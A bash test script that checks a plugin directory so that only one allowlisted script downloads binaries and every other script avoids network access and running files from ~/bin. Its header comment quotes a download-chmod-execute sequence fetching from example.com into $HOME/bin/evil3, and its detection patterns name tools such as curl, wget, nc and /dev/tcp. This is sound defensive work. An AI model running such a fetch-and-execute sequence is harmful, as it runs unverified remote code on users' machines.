#!/bin/bash
# Asserts a property, not a spelling: nothing in plugin/ may fetch from the network or
# run a binary out of ~/bin except through the shared, verified path.
#
# ## Why this is an allowlist
#
# The first version enumerated what a violation looks like — grep for `curl`, grep for
# `chmod +x`. A reviewer said that matched spellings rather than the property, and they
# were right: this scanner reported 3 passed / 0 failed on a script that did
#
#     python3 -c "…urlretrieve…" https://example.com/payload "$HOME/bin/evil3"
#     chmod 755 "$HOME/bin/evil3"
#     "$HOME/bin/evil3" "$@"
#
# No `curl`, no `chmod +x`, no `exec "$BINARY"` — three clauses, all evaded, while doing
# exactly the thing the round-2 CRITICAL was filed about. An enumeration of violations can
# always be walked around; the set of *permitted* files cannot.
#
# So the rule is inverted. Exactly one file may fetch, exactly one may verify, and every
# other script under plugin/ must be free of network access and of ~/bin execution. A new
# script is a failure until it is either added here deliberately or written to delegate.
set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
PLUGIN="$ROOT/plugin"
FETCHER="fetch-release-binary.sh"
VERIFIER="verify-download.sh"
PASS=0
FAIL=0

ok()  { echo "  ok   — $1"; PASS=$((PASS + 1)); }
bad() { echo "  FAIL — $1"; FAIL=$((FAIL + 1)); }

# Comments necessarily describe the defects these files no longer have, so a scan that
# read prose would flag the explanation as the offence — that happened once already.
code_of() { grep -vE '^[[:space:]]*(#|$)' "$1"; }

echo "no unverified downloads in plugin/"

# Any way of reaching the network, not any particular tool. Adding a new fetch mechanism
# to this list is the maintenance cost of the allowlist, and it is the right cost: the
# alternative is a scanner that silently stops covering whatever gets invented next.
NETWORK_RE='curl|wget|nscurl|urlretrieve|urlopen|requests\.|http\.client|nc |ftp |scp |URLSession|/dev/tcp'
# Running something out of the install directory, however it is spelled.
RUNS_INSTALLED_RE='(exec|bash|sh|source|\.)[[:space:]]+"?\$(HOME|\{HOME\})?[^"]*bin/|\$BINARY|\$INSTALL_DIR|~/bin/'

while IFS= read -r script; do
    rel="${script#$ROOT/}"
    base=$(basename "$script")
    body=$(code_of "$script")

    touches_network=false
    runs_installed=false
    printf '%s' "$body" | grep -qE "$NETWORK_RE" && touches_network=true
    printf '%s' "$body" | grep -qE "$RUNS_INSTALLED_RE" && runs_installed=true

    case "$base" in
        "$FETCHER")
            # The one permitted downloader. It must verify what it fetched.
            if printf '%s' "$body" | grep -q "$VERIFIER"; then
                ok "$rel is the permitted downloader and calls $VERIFIER"
            else
                bad "$rel downloads WITHOUT calling $VERIFIER"
            fi
            ;;
        "$VERIFIER")
            # The verifier must not fetch anything itself.
            if $touches_network; then
                bad "$rel is the verifier but reaches the network"
            else
                ok "$rel verifies without fetching"
            fi
            ;;
        *)
            if $touches_network; then
                bad "$rel reaches the network directly — only $FETCHER may"
            elif $runs_installed && ! printf '%s' "$body" | grep -q "$FETCHER"; then
                bad "$rel runs a binary from the install dir without obtaining it via $FETCHER"
            elif $runs_installed; then
                ok "$rel obtains its binary through $FETCHER before running it"
            else
                ok "$rel neither fetches nor runs an installed binary"
            fi
            ;;
    esac
done < <(find "$PLUGIN" -type f -name '*.sh' | sort)

# The verifier must actually ship. It lives under plugin/ rather than scripts/ precisely
# because scripts/ is repo-only and would not exist on a user's machine.
if [ -f "$PLUGIN/bin/$VERIFIER" ]; then
    ok "$VERIFIER ships inside the plugin"
else
    bad "$VERIFIER is missing from the plugin — callers would fail at runtime"
fi

echo
echo "  $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
